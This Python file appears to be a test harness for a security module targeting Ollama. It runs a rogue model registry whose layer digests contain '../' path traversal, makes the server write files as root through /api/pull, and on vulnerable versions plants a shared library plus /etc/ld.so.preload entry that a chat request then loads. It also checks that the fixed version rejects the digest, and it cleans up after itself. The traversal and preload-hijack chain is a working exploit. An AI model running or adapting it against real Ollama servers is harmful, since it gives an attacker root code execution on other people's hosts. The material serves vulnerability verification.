"""Independent OCI, traversal and real Ollama loader controls; no MSF payload."""
from pathlib import Path
import base64
import hashlib
import http.server
import json
import http.client
import os
import struct
import subprocess
import threading
import time
import urllib.error
import urllib.parse
import urllib.request


class Native:
    def __init__(self, runtime, artifacts, version):
        self.runtime = runtime
        self.out = Path(artifacts)
        self.version = version
        self.receipt = dict(version=version, requests=[], registry=[], files=[], module_invoked=False)
        self.blobs = {}
        self.manifests = {}
        self.names = []
        self.cleanup_paths = ['/etc/ld.so.preload', '/tmp/module-target-ollama-native-proof']
        self.server = None

    def save(self):
        (self.out / 'native.json').write_text(json.dumps(self.receipt, indent=2) + '\n')

    def http(self, role, path, data=None, method=None, timeout=20):
        url = self.runtime[role] + path
        body = None if data is None else json.dumps(data).encode()
        request = urllib.request.Request(url, data=body, method=method, headers={'Content-Type':'application/json'})
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        try:
            response = opener.open(request, timeout=timeout)
        except urllib.error.HTTPError as error:
            response = error
        with response:
            raw = response.read()
            row = dict(role=role, path=path, method=request.get_method(), data=data, status=response.status,
                       headers=dict(response.headers.items()), body_base64=base64.b64encode(raw).decode())
        self.receipt['requests'].append(row)
        self.save()
        return row['status'], json.loads(raw)

    def observer(self, path, data=None):
        status, value = self.http('observer', path, data)
        assert status == 200, value
        return value

    def file(self, path):
        value = self.observer('/file?' + urllib.parse.urlencode({'path':path}))
        self.receipt['files'].append(dict(path=path, value=value))
        self.save()
        return value

    def remove(self, paths):
        self.observer('/remove', {'paths':paths})
        for path in paths:
            assert not self.file(path)['exists'], path

    def digest(self, data):
        return 'sha256:' + hashlib.sha256(data).hexdigest()

    def blob(self, data, digest=None):
        digest = digest or self.digest(data)
        self.blobs[digest] = data
        self.blobs[digest.rsplit('/',1)[-1]] = data
        return dict(mediaType='application/vnd.ollama.image.model', digest=digest, size=len(data))

    def manifest(self, name, config, layers):
        config_layer = self.blob(config)
        config_layer['mediaType'] = 'application/vnd.docker.container.image.v1+json'
        value = dict(schemaVersion=2, mediaType='application/vnd.docker.distribution.manifest.v2+json', config=config_layer, layers=layers)
        self.manifests[name] = json.dumps(value).encode()
        self.names.append(name)
        return self.remote(name)

    def remote(self, name):
        return self.origin.removeprefix('http://') + name

    def pull(self, name):
        return self.http('api','/api/pull',{'name':name,'insecure':True,'stream':False})

    def start_registry(self):
        native = self
        class Registry(http.server.BaseHTTPRequestHandler):
            def log_message(self,*args):
                pass
            def do_HEAD(self):
                self.respond(False)
            def do_GET(self):
                self.respond(True)
            def respond(self, send):
                path = urllib.parse.unquote(urllib.parse.urlsplit(self.path).path)
                status, body, kind = 200, None, 'application/octet-stream'
                if path.rstrip('/') == '/v2':
                    body, kind = b'{}', 'application/json'
                elif path.startswith('/v2/') and '/manifests/' in path:
                    name = path[4:].split('/manifests/',1)[0]
                    body = native.manifests.get(name)
                    kind = 'application/vnd.docker.distribution.manifest.v2+json'
                else:
                    key = path.rsplit('/',1)[-1]
                    body = native.blobs.get(key)
                if body is None:
                    status, body, kind = 404, b'{"error":"Unknown native registry resource"}', 'application/json'
                complete = body
                start, end = 0, len(body)-1
                requested = self.headers.get('Range')
                if status == 200 and requested and requested.startswith('bytes='):
                    left, right = requested[6:].split('-',1)
                    start = int(left)
                    end = int(right) if right else len(body)-1
                    body, status = body[start:end+1], 206
                self.send_response(status)
                self.send_header('Content-Type',kind)
                self.send_header('Docker-Content-Digest', native.digest(complete))
                self.send_header('Content-Length',str(len(body)))
                if status == 206:
                    self.send_header('Content-Range',f'bytes {start}-{end}/{len(complete)}')
                self.end_headers()
                if send:
                    self.wfile.write(body)
                row=dict(method=self.command,path=self.path,status=status,range=requested,bytes=len(body),sha256=hashlib.sha256(body).hexdigest())
                native.receipt['registry'].append(row)
                with (native.out/'registry.jsonl').open('a') as log:
                    log.write(json.dumps(row)+'\n')
        self.server = http.server.ThreadingHTTPServer(('0.0.0.0',0),Registry)
        self.thread = threading.Thread(target=self.server.serve_forever,daemon=True)
        self.thread.start()
        self.origin = 'http://' + self.runtime['callback_host'] + ':' + str(self.server.server_port) + '/'
        self.receipt['origin'] = self.origin

    def traversal(self, name, files):
        layers = []
        for label, path, data in [('discard','/tmp/module-target-ollama/native/discard-' + name,b'discard-me'), *files]:
            digest = '../'*14 + path.removeprefix('/')
            layers.append(self.blob(data,digest))
            self.cleanup_paths.append(path)
        remote = self.manifest('nativecontrol/'+name,b'{}',layers)
        return self.pull(remote)

    def verify(self):
        try:
            status, version = self.http('api','/api/version')
            assert status == 200 and version == {'version':self.version}, version
            initial = self.observer('/snapshot')
            assert initial['uid'] == 0 and initial['backend_exit'] is None and not initial['preload']['exists'] and not initial['proof']['exists']
            self.receipt['initial'] = initial
            metadata = self.observer('/metadata')
            assert metadata['uid'] == 0
            vendor = json.loads(Path(__file__).with_name('vendor.json').read_text())[self.version]
            assert metadata['vendor_sha256'] == vendor['sha256'], metadata['vendor_sha256']
            self.receipt['metadata'] = metadata
            local = self.observer('/local-loader',{})
            assert local['exit'] == 0 and local['proof']['uid'] == 0, local
            proof = json.loads(base64.b64decode(local['proof']['base64']))
            assert proof['uid'] == 0 and proof['ppid'] == initial['observer_pid'] and proof['exe'] == '/usr/bin/true',proof
            self.receipt['local_loader'] = local
            self.remove(['/tmp/module-target-ollama-native-proof'])
            self.start_registry()
            key, value = b'general.architecture', b'llama'
            gguf = b'GGUF' + struct.pack('<IQQQ',3,0,1,len(key)) + key + struct.pack('<IQ',8,len(value)) + value
            config = json.dumps(dict(model_format='gguf',model_family='llama',model_families=['llama'],model_type='0B',file_type='F32')).encode()
            good = self.manifest('nativecontrol/good',config,[self.blob(gguf)])
            status, pulled = self.pull(good)
            assert status == 200 and pulled.get('status') == 'success',(status,pulled)
            status, shown = self.http('api','/api/show',{'name':good})
            assert status == 200 and shown['details']['family'] == 'llama',(status,shown)
            self.receipt['ordinary_model'] = dict(name=good,pull=pulled,show=shown,gguf_base64=base64.b64encode(gguf).decode())
            content = "Native 'quote' \\ Unicode雪\r\nEnd\n".encode()
            sentinel = '/tmp/module-target-ollama/native/sentinel'
            result = self.traversal('write',[('sentinel',sentinel,content)])
            physical = self.file(sentinel)
            self.receipt['traversal'] = dict(response=result,physical=physical)
            if self.version == '0.1.34':
                assert physical == {'exists':False},physical
                assert 'invalid digest format' in json.dumps(result),result
                self.receipt['fixed_denial'] = True
            else:
                assert physical['uid']==0 and base64.b64decode(physical['base64'])==content,physical
                self.remove([sentinel])
                library = base64.b64decode(metadata['native_base64'])
                library_path='/tmp/module-target-ollama/native/native-loader.so'
                preload=(library_path+'\n').encode()
                result=self.traversal('loader',[('library',library_path,library),('preload','/etc/ld.so.preload',preload)])
                armed=self.observer('/snapshot')
                self.receipt['armed']=armed
                assert not armed['proof']['exists'],armed
                assert armed['preload']['uid']==0 and base64.b64decode(armed['preload']['base64'])==preload,armed
                assert base64.b64decode(self.file(library_path)['base64'])==library
                try:
                    chat=self.http('api','/api/chat',{'model':good,'messages':[{'role':'user','content':'native'}],'stream':False,'options':{'num_ctx':128,'num_predict':1,'num_gpu':0,'num_thread':1},'keep_alive':0},timeout=10)
                    self.receipt['chat']=chat
                except TimeoutError as error:
                    self.receipt['chat_timeout']=str(error)
                deadline=time.monotonic()+10
                while True:
                    current=self.observer('/snapshot')
                    if current['proof']['exists']:
                        break
                    if time.monotonic()>=deadline:
                        raise TimeoutError('Native API chat did not load the independent library')
                    time.sleep(0.1)
                proof=json.loads(base64.b64decode(current['proof']['base64']))
                assert proof['uid']==0 and proof['ppid']==initial['backend_pid'],proof
                assert proof['exe'].startswith('/tmp/ollama') and proof['exe'].endswith('/runners/cpu/ollama_llama_server'),proof
                assert not current['preload']['exists'],current
                self.receipt['api_loader_proof']=proof
                self.receipt['post_trigger']=current
            self.receipt['passed']=True
            return self.receipt
        except BaseException as error:
            self.receipt['error']=dict(type=type(error).__name__,message=str(error))
            raise
        finally:
            try:
                self.receipt['before_recovery']=self.observer('/snapshot')
                self.remove(list(dict.fromkeys(self.cleanup_paths)))
                if self.server:
                    for name in self.names:
                        self.http('api','/api/delete',{'name':self.remote(name)},method='DELETE')
                self.receipt['after_recovery']=self.observer('/snapshot')
                self.receipt['api_after']=self.http('api','/api/version')
                assert not self.receipt['after_recovery']['preload']['exists']
                assert not self.receipt['after_recovery']['files'], self.receipt['after_recovery']['files']
                status, models = self.http('api', '/api/tags')
                assert status == 200 and not models['models'], models
            finally:
                if self.server:
                    self.server.shutdown();self.server.server_close();self.thread.join(5)
                    self.receipt['registry_closed']=not self.thread.is_alive()
                self.save()


if __name__ == '__main__':
    runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
    api = runtime['endpoints']['target']
    binding = subprocess.check_output(runtime['compose'] + ['port', 'target', '11435'], text=True, timeout=20).strip()
    assert binding.startswith('127.0.0.1:'), binding
    endpoints = dict(api=f"http://{api['host']}:{api['port']}", observer='http://' + binding)
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    # Docker healthchecks would launch a dynamic helper and could trigger the
    # armed global preload. Readiness and all armed-state reads stay on the host.
    deadline = time.monotonic() + 90
    for role, path in [('observer', '/metadata'), ('api', '/api/version')]:
        while True:
            try:
                with opener.open(endpoints[role] + path, timeout=2) as response:
                    value = json.load(response)
                    assert response.status == 200
                    if role == 'observer':
                        endpoints['callback_host'] = value['callback_host']
                    break
            except (urllib.error.URLError, TimeoutError, http.client.RemoteDisconnected, ConnectionResetError):
                if time.monotonic() >= deadline:
                    raise TimeoutError('Ollama readiness failed: ' + role)
                time.sleep(0.1)
    out = Path(runtime['artifacts']) / 'ollama-native'
    out.mkdir()
    native = Native(endpoints, out, os.environ['OLLAMA_VERSION'])
    native.verify()
    assert native.receipt['registry_closed']
    print(json.dumps(dict(passed=True, registry_closed=True, version=native.version,
                          endpoints=endpoints, proof=native.receipt.get('api_loader_proof'),
                          fixed_denial=native.receipt.get('fixed_denial', False))))
